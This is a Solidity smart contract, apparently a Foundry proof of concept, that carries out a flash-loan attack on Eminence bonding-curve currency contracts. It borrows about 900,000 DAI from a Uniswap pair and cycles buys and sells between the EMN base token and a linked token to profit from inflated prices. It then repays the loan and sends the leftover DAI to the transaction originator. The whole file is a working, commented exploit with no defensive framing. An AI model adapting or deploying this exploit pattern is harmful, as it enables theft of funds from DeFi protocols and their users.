// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";

interface IEminenceCurrency {
    function award(address _to, uint _amount) external;
    function claim(address _from, uint _amount) external;
    function addGM(address _gm) external;
    function buy(uint256 _deposit, uint _minReturn) external returns (uint256);
    function sell(uint256 _amount, uint _minReturn) external returns (uint256);
}

interface IEminenceCurrencyBase {
    function buy(uint256 _deposit, uint256 _minReturn) external returns (uint256);
    function sell(uint256 _amount, uint256 _minReturn) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
interface IUniPair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function token1() external view returns (address);
}

contract BondingCurveExploiter {

    IEminenceCurrency public eminenceCurrency;
    IEminenceCurrencyBase public eminenceCurrencyBase;
    IUniPair public uniPair;

    constructor (address _uniPair, address _eminenceCurrency, address _eminenceCurrencyBase) {
        eminenceCurrency = IEminenceCurrency(_eminenceCurrency);
        eminenceCurrencyBase = IEminenceCurrencyBase(_eminenceCurrencyBase);
        uniPair = IUniPair(_uniPair);
        uniPair.swap(0, 900_000e18, address(this), bytes("bytes enough"));
    }

    function uniswapV2Call(address, uint, uint _amount1, bytes calldata) external {
        IERC20 dai = IERC20(uniPair.token1());
        dai.approve(address(eminenceCurrencyBase),type(uint256).max);
        eminenceCurrencyBase.approve(address(eminenceCurrency),type(uint256).max);

        uint256 baseAmount = eminenceCurrencyBase.buy(_amount1, 0); // buy up EMN using all DAI, increases supply of both
        uint256 tokenAmount = eminenceCurrency.buy(baseAmount / 2, 0); // convert half of EMN -> TOKEN, burns EMN supply

        eminenceCurrencyBase.sell(baseAmount / 2, 0); // sell EMN which has an inflated price
        baseAmount = eminenceCurrency.sell(tokenAmount,0); // swap TOKEN -> EMN, at no loss of EMN
        eminenceCurrencyBase.sell(baseAmount,0); // sell remaining EMN tokens

        uint256 loanPlusInterest = (_amount1*(10**18)*1000/997/(10**18))+1; // exact amount owed
        dai.transfer(msg.sender, loanPlusInterest); // pay back flashloan
        dai.transfer(tx.origin, dai.balanceOf(address(this)));
    }

}